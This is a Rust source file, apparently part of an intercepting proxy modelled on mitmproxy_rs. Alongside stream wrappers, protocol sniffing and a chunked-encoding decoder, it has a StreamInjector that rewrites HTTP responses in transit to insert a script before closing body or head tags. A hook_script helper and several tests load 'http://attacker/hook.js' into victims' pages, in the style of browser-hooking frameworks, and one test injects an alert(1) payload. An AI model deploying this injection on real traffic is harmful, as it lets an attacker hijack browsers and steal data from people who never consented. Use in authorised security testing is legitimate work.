//! Stream Abstraction Layer
//!
//! Provides a unified stream interface for different transport types,
//! inspired by mitmproxy_rs's stream API.
//!
//! # Design
//!
//! ```text
//! ┌────────────────────────────────────────────┐
//! │              ProxyStream trait             │
//! │  read() / write() / flush() / close()     │
//! └────────────────────────────────────────────┘
//!        ▲              ▲              ▲
//!        │              │              │
//! ┌──────┴──────┐ ┌─────┴─────┐ ┌──────┴──────┐
//! │  TcpStream  │ │ TlsStream │ │ BufferedStr │
//! └─────────────┘ └───────────┘ └─────────────┘
//! ```

use std::io::{self, Read, Write};
use std::net::{Shutdown, SocketAddr, TcpStream};
use std::time::Duration;

/// Unified stream trait for proxy connections
pub trait ProxyStream: Read + Write + Send {
    /// Get peer address
    fn peer_addr(&self) -> io::Result<SocketAddr>;

    /// Get local address
    fn local_addr(&self) -> io::Result<SocketAddr>;

    /// Set read timeout
    fn set_read_timeout(&self, timeout: Option<Duration>) -> io::Result<()>;

    /// Set write timeout
    fn set_write_timeout(&self, timeout: Option<Duration>) -> io::Result<()>;

    /// Shutdown the stream
    fn shutdown(&self, how: Shutdown) -> io::Result<()>;

    /// Check if stream is TLS encrypted
    fn is_tls(&self) -> bool {
        false
    }

    /// Get SNI hostname (for TLS streams)
    fn sni_hostname(&self) -> Option<&str> {
        None
    }
}

/// TCP stream wrapper implementing ProxyStream
pub struct TcpProxyStream {
    inner: TcpStream,
}

impl TcpProxyStream {
    pub fn new(stream: TcpStream) -> Self {
        Self { inner: stream }
    }

    pub fn connect(addr: SocketAddr) -> io::Result<Self> {
        let stream = TcpStream::connect(addr)?;
        Ok(Self::new(stream))
    }

    pub fn connect_timeout(addr: SocketAddr, timeout: Duration) -> io::Result<Self> {
        let stream = TcpStream::connect_timeout(&addr, timeout)?;
        Ok(Self::new(stream))
    }

    pub fn into_inner(self) -> TcpStream {
        self.inner
    }
}

impl Read for TcpProxyStream {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        self.inner.read(buf)
    }
}

impl Write for TcpProxyStream {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        self.inner.write(buf)
    }

    fn flush(&mut self) -> io::Result<()> {
        self.inner.flush()
    }
}

impl ProxyStream for TcpProxyStream {
    fn peer_addr(&self) -> io::Result<SocketAddr> {
        self.inner.peer_addr()
    }

    fn local_addr(&self) -> io::Result<SocketAddr> {
        self.inner.local_addr()
    }

    fn set_read_timeout(&self, timeout: Option<Duration>) -> io::Result<()> {
        self.inner.set_read_timeout(timeout)
    }

    fn set_write_timeout(&self, timeout: Option<Duration>) -> io::Result<()> {
        self.inner.set_write_timeout(timeout)
    }

    fn shutdown(&self, how: Shutdown) -> io::Result<()> {
        self.inner.shutdown(how)
    }
}

/// Buffered stream wrapper with peek capability
pub struct BufferedStream<S: ProxyStream> {
    inner: S,
    read_buffer: Vec<u8>,
    read_pos: usize,
}

impl<S: ProxyStream> BufferedStream<S> {
    pub fn new(stream: S) -> Self {
        Self {
            inner: stream,
            read_buffer: Vec::with_capacity(8192),
            read_pos: 0,
        }
    }

    /// Peek at buffered data without consuming it
    pub fn peek(&mut self, n: usize) -> io::Result<&[u8]> {
        // Fill buffer if needed
        while self.read_buffer.len() - self.read_pos < n {
            let mut buf = [0u8; 8192];
            match self.inner.read(&mut buf) {
                Ok(0) => break, // EOF
                Ok(len) => {
                    // Compact buffer if needed
                    if self.read_pos > 0 {
                        self.read_buffer.drain(..self.read_pos);
                        self.read_pos = 0;
                    }
                    self.read_buffer.extend_from_slice(&buf[..len]);
                }
                Err(e) if e.kind() == io::ErrorKind::WouldBlock => break,
                Err(e) => return Err(e),
            }
        }

        let available = &self.read_buffer[self.read_pos..];
        let peek_len = n.min(available.len());
        Ok(&available[..peek_len])
    }

    pub fn into_inner(self) -> S {
        self.inner
    }
}

impl<S: ProxyStream> Read for BufferedStream<S> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        // First, consume from buffer
        let buffered = &self.read_buffer[self.read_pos..];
        if !buffered.is_empty() {
            let len = buf.len().min(buffered.len());
            buf[..len].copy_from_slice(&buffered[..len]);
            self.read_pos += len;

            // Clear buffer if fully consumed
            if self.read_pos == self.read_buffer.len() {
                self.read_buffer.clear();
                self.read_pos = 0;
            }

            return Ok(len);
        }

        // Buffer empty, read directly
        self.inner.read(buf)
    }
}

impl<S: ProxyStream> Write for BufferedStream<S> {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        self.inner.write(buf)
    }

    fn flush(&mut self) -> io::Result<()> {
        self.inner.flush()
    }
}

impl<S: ProxyStream> ProxyStream for BufferedStream<S> {
    fn peer_addr(&self) -> io::Result<SocketAddr> {
        self.inner.peer_addr()
    }

    fn local_addr(&self) -> io::Result<SocketAddr> {
        self.inner.local_addr()
    }

    fn set_read_timeout(&self, timeout: Option<Duration>) -> io::Result<()> {
        self.inner.set_read_timeout(timeout)
    }

    fn set_write_timeout(&self, timeout: Option<Duration>) -> io::Result<()> {
        self.inner.set_write_timeout(timeout)
    }

    fn shutdown(&self, how: Shutdown) -> io::Result<()> {
        self.inner.shutdown(how)
    }

    fn is_tls(&self) -> bool {
        self.inner.is_tls()
    }

    fn sni_hostname(&self) -> Option<&str> {
        self.inner.sni_hostname()
    }
}

/// Stream pair for bidirectional relay
pub struct StreamPair<C: ProxyStream, S: ProxyStream> {
    pub client: C,
    pub server: S,
}

impl<C: ProxyStream, S: ProxyStream> StreamPair<C, S> {
    pub fn new(client: C, server: S) -> Self {
        Self { client, server }
    }
}

/// Protocol detection from initial bytes
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DetectedProtocol {
    /// HTTP/1.x (starts with HTTP method)
    Http,
    /// TLS/SSL (starts with 0x16)
    Tls,
    /// SOCKS5 (starts with 0x05)
    Socks5,
    /// SSH (starts with "SSH-")
    Ssh,
    /// Unknown protocol
    Unknown,
}

impl DetectedProtocol {
    /// Detect protocol from initial bytes
    pub fn detect(data: &[u8]) -> Self {
        if data.is_empty() {
            return Self::Unknown;
        }

        // Check first byte
        match data[0] {
            // TLS/SSL handshake
            0x16 => Self::Tls,
            // SOCKS5
            0x05 => Self::Socks5,
            // HTTP methods
            b'G' | b'P' | b'H' | b'D' | b'O' | b'T' | b'C' => {
                // Check for HTTP methods
                let methods = [
                    b"GET ".as_slice(),
                    b"POST ".as_slice(),
                    b"HEAD ".as_slice(),
                    b"DELETE ".as_slice(),
                    b"OPTIONS ".as_slice(),
                    b"TRACE ".as_slice(),
                    b"CONNECT ".as_slice(),
                    b"PUT ".as_slice(),
                    b"PATCH ".as_slice(),
                ];
                for method in methods {
                    if data.len() >= method.len() && &data[..method.len()] == method {
                        return Self::Http;
                    }
                }
                Self::Unknown
            }
            // SSH
            b'S' if data.len() >= 4 && &data[..4] == b"SSH-" => Self::Ssh,
            _ => Self::Unknown,
        }
    }
}

/// Injection point configuration
#[derive(Debug, Clone)]
pub enum InjectionPoint {
    /// Inject before </body> tag
    BeforeBodyClose,
    /// Inject before </head> tag
    BeforeHeadClose,
    /// Inject at end of document
    EndOfDocument,
}

impl Default for InjectionPoint {
    fn default() -> Self {
        Self::BeforeBodyClose
    }
}

/// StreamInjector - HTML content injection with sliding window
///
/// Handles injection into HTTP responses, including:
/// - Split tag detection across chunk boundaries
/// - Chunked transfer encoding handling
/// - Content-Length recalculation
pub struct StreamInjector {
    /// Payload to inject (usually a script tag)
    payload: String,
    /// Where to inject the payload
    injection_point: InjectionPoint,
    /// Sliding window buffer for split tag detection
    window_buffer: Vec<u8>,
    /// Maximum tag length to detect across boundaries
    max_tag_len: usize,
    /// Whether injection has already occurred
    injected: bool,
    /// Total bytes injected (for Content-Length adjustment)
    bytes_added: usize,
}

impl StreamInjector {
    /// Create a new injector with the given payload
    pub fn new(payload: String) -> Self {
        Self {
            payload,
            injection_point: InjectionPoint::default(),
            window_buffer: Vec::with_capacity(32),
            max_tag_len: 16, // Long enough for </body> or </head>
            injected: false,
            bytes_added: 0,
        }
    }

    /// Set the injection point
    pub fn with_injection_point(mut self, point: InjectionPoint) -> Self {
        self.injection_point = point;
        self
    }

    /// Create an injector for a hook.js script
    pub fn hook_script(hook_url: &str) -> Self {
        let payload = format!("<script src=\"{}\"></script>", hook_url);
        Self::new(payload)
    }

    /// Reset state for a new response
    pub fn reset(&mut self) {
        self.window_buffer.clear();
        self.injected = false;
        self.bytes_added = 0;
    }

    /// Get the target tag based on injection point
    fn target_tag(&self) -> &'static [u8] {
        match self.injection_point {
            InjectionPoint::BeforeBodyClose => b"</body>",
            InjectionPoint::BeforeHeadClose => b"</head>",
            InjectionPoint::EndOfDocument => b"</html>",
        }
    }

    /// Process a chunk of data, potentially injecting payload
    ///
    /// Returns the processed data with injection if applicable
    pub fn process_chunk(&mut self, data: &[u8]) -> Vec<u8> {
        if self.injected || data.is_empty() {
            return data.to_vec();
        }

        let tag = self.target_tag();

        // Combine window buffer with new data for split tag detection
        let mut combined = Vec::with_capacity(self.window_buffer.len() + data.len());
        combined.extend_from_slice(&self.window_buffer);
        combined.extend_from_slice(data);

        // Search for injection point (case-insensitive)
        if let Some(pos) = self.find_tag_position(&combined, tag) {
            // Found the tag
            let mut result = Vec::with_capacity(combined.len() + self.payload.len());

            // Bytes before the tag
            result.extend_from_slice(&combined[..pos]);
            // Inject payload
            result.extend_from_slice(self.payload.as_bytes());
            // The tag and everything after
            result.extend_from_slice(&combined[pos..]);

            self.injected = true;
            self.bytes_added = self.payload.len();
            self.window_buffer.clear();

            // Remove the window buffer portion from the result if needed
            if self.window_buffer.len() > 0 {
                result.drain(..self.window_buffer.len());
            }
            result
        } else {
            // No tag found yet, update sliding window
            let window_start = if combined.len() > self.max_tag_len {
                combined.len() - self.max_tag_len
            } else {
                0
            };
            self.window_buffer = combined[window_start..].to_vec();

            // Return data that won't be part of split tag
            if data.len() > self.max_tag_len {
                data[..data.len() - self.max_tag_len].to_vec()
            } else {
                Vec::new() // Buffer all small chunks
            }
        }
    }

    /// Find tag position (case-insensitive)
    fn find_tag_position(&self, data: &[u8], tag: &[u8]) -> Option<usize> {
        let data_lower: Vec<u8> = data.iter().map(|b| b.to_ascii_lowercase()).collect();
        let tag_lower: Vec<u8> = tag.iter().map(|b| b.to_ascii_lowercase()).collect();

        data_lower
            .windows(tag_lower.len())
            .position(|window| window == tag_lower.as_slice())
    }

    /// Flush any remaining buffered data
    pub fn flush(&mut self) -> Vec<u8> {
        let remaining = std::mem::take(&mut self.window_buffer);
        remaining
    }

    /// Check if injection has occurred
    pub fn has_injected(&self) -> bool {
        self.injected
    }

    /// Get the number of bytes added by injection
    pub fn bytes_added(&self) -> usize {
        self.bytes_added
    }

    /// Process a complete body at once (simpler path for non-chunked)
    pub fn inject_into_body(&mut self, body: &[u8]) -> Vec<u8> {
        self.reset();

        let tag = self.target_tag();
        let body_str = String::from_utf8_lossy(body);

        // Case-insensitive search
        let tag_str = String::from_utf8_lossy(tag);
        let body_lower = body_str.to_lowercase();
        let tag_lower = tag_str.to_lowercase();

        if let Some(pos) = body_lower.find(&tag_lower) {
            let mut result = String::with_capacity(body.len() + self.payload.len());
            result.push_str(&body_str[..pos]);
            result.push_str(&self.payload);
            result.push_str(&body_str[pos..]);

            self.injected = true;
            self.bytes_added = self.payload.len();

            result.into_bytes()
        } else {
            body.to_vec()
        }
    }
}

/// Chunked transfer encoding decoder
pub struct ChunkedDecoder {
    /// Accumulated body data
    body: Vec<u8>,
    /// State of the decoder
    state: ChunkedState,
    /// Remaining bytes in current chunk
    remaining: usize,
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum ChunkedState {
    /// Reading chunk size line
    ReadingSize,
    /// Reading chunk data
    ReadingData,
    /// Reading trailing CRLF after chunk
    ReadingTrailer,
    /// Final chunk received (size 0)
    Complete,
}

impl ChunkedDecoder {
    pub fn new() -> Self {
        Self {
            body: Vec::new(),
            state: ChunkedState::ReadingSize,
            remaining: 0,
        }
    }

    /// Feed data into the decoder
    /// Returns true if decoding is complete
    pub fn feed(&mut self, data: &[u8]) -> bool {
        let mut pos = 0;

        while pos < data.len() && self.state != ChunkedState::Complete {
            match self.state {
                ChunkedState::ReadingSize => {
                    // Look for CRLF
                    if let Some(crlf_pos) = self.find_crlf(&data[pos..]) {
                        let size_line = &data[pos..pos + crlf_pos];
                        let size_str = String::from_utf8_lossy(size_line);
                        // Parse hex size (ignore chunk extensions after ;)
                        let size_hex = size_str.split(';').next().unwrap_or("").trim();
                        if let Ok(size) = usize::from_str_radix(size_hex, 16) {
                            self.remaining = size;
                            if size == 0 {
                                self.state = ChunkedState::Complete;
                            } else {
                                self.state = ChunkedState::ReadingData;
                            }
                        }
                        pos += crlf_pos + 2; // Skip CRLF
                    } else {
                        break; // Need more data
                    }
                }
                ChunkedState::ReadingData => {
                    let available = data.len() - pos;
                    let to_read = self.remaining.min(available);
                    self.body.extend_from_slice(&data[pos..pos + to_read]);
                    self.remaining -= to_read;
                    pos += to_read;

                    if self.remaining == 0 {
                        self.state = ChunkedState::ReadingTrailer;
                    }
                }
                ChunkedState::ReadingTrailer => {
                    // Skip CRLF after chunk
                    if pos + 1 < data.len() {
                        pos += 2; // Skip CRLF
                        self.state = ChunkedState::ReadingSize;
                    } else {
                        break;
                    }
                }
                ChunkedState::Complete => break,
            }
        }

        self.state == ChunkedState::Complete
    }

    fn find_crlf(&self, data: &[u8]) -> Option<usize> {
        for i in 0..data.len().saturating_sub(1) {
            if data[i] == b'\r' && data[i + 1] == b'\n' {
                return Some(i);
            }
        }
        None
    }

    /// Get the accumulated body
    pub fn body(&self) -> &[u8] {
        &self.body
    }

    /// Take ownership of the body
    pub fn take_body(self) -> Vec<u8> {
        self.body
    }

    /// Check if complete
    pub fn is_complete(&self) -> bool {
        self.state == ChunkedState::Complete
    }
}

impl Default for ChunkedDecoder {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_http() {
        assert_eq!(DetectedProtocol::detect(b"GET / HTTP/1.1"), DetectedProtocol::Http);
        assert_eq!(DetectedProtocol::detect(b"POST /api"), DetectedProtocol::Http);
        assert_eq!(DetectedProtocol::detect(b"CONNECT host:443"), DetectedProtocol::Http);
    }

    #[test]
    fn test_detect_tls() {
        // TLS handshake starts with 0x16
        assert_eq!(DetectedProtocol::detect(&[0x16, 0x03, 0x01]), DetectedProtocol::Tls);
    }

    #[test]
    fn test_detect_socks5() {
        assert_eq!(DetectedProtocol::detect(&[0x05, 0x01, 0x00]), DetectedProtocol::Socks5);
    }

    #[test]
    fn test_detect_ssh() {
        assert_eq!(DetectedProtocol::detect(b"SSH-2.0-OpenSSH"), DetectedProtocol::Ssh);
    }

    #[test]
    fn test_detect_unknown() {
        assert_eq!(DetectedProtocol::detect(&[0x00, 0x00, 0x00]), DetectedProtocol::Unknown);
        assert_eq!(DetectedProtocol::detect(&[]), DetectedProtocol::Unknown);
    }

    #[test]
    fn test_stream_injector_simple() {
        let mut injector = StreamInjector::hook_script("http://attacker/hook.js");
        let body = b"<html><head></head><body>Hello</body></html>";
        let result = injector.inject_into_body(body);
        let result_str = String::from_utf8_lossy(&result);

        assert!(result_str.contains("<script src=\"http://attacker/hook.js\"></script></body>"));
        assert!(injector.has_injected());
    }

    #[test]
    fn test_stream_injector_case_insensitive() {
        let mut injector = StreamInjector::hook_script("http://attacker/hook.js");
        let body = b"<html><BODY>Hello</BODY></html>";
        let result = injector.inject_into_body(body);
        let result_str = String::from_utf8_lossy(&result);

        assert!(result_str.contains("<script src=\"http://attacker/hook.js\"></script></BODY>"));
    }

    #[test]
    fn test_stream_injector_no_body_tag() {
        let mut injector = StreamInjector::hook_script("http://attacker/hook.js");
        let body = b"<html>No body tag here</html>";
        let result = injector.inject_into_body(body);

        assert_eq!(result, body);
        assert!(!injector.has_injected());
    }

    #[test]
    fn test_stream_injector_head_injection() {
        let mut injector = StreamInjector::new("<script>alert(1)</script>".to_string())
            .with_injection_point(InjectionPoint::BeforeHeadClose);
        let body = b"<html><head><title>Test</title></head><body></body></html>";
        let result = injector.inject_into_body(body);
        let result_str = String::from_utf8_lossy(&result);

        assert!(result_str.contains("<script>alert(1)</script></head>"));
    }

    #[test]
    fn test_chunked_decoder_simple() {
        let mut decoder = ChunkedDecoder::new();
        let chunked = b"5\r\nHello\r\n6\r\n World\r\n0\r\n\r\n";

        assert!(decoder.feed(chunked));
        assert_eq!(decoder.body(), b"Hello World");
    }

    #[test]
    fn test_chunked_decoder_multiple_feeds() {
        let mut decoder = ChunkedDecoder::new();

        assert!(!decoder.feed(b"5\r\nHello\r\n"));
        assert!(!decoder.feed(b"6\r\n World\r\n"));
        assert!(decoder.feed(b"0\r\n\r\n"));

        assert_eq!(decoder.body(), b"Hello World");
    }

    #[test]
    fn test_chunked_decoder_with_extensions() {
        let mut decoder = ChunkedDecoder::new();
        // Chunk with extension (should be ignored)
        let chunked = b"5;ext=val\r\nHello\r\n0\r\n\r\n";

        assert!(decoder.feed(chunked));
        assert_eq!(decoder.body(), b"Hello");
    }
}
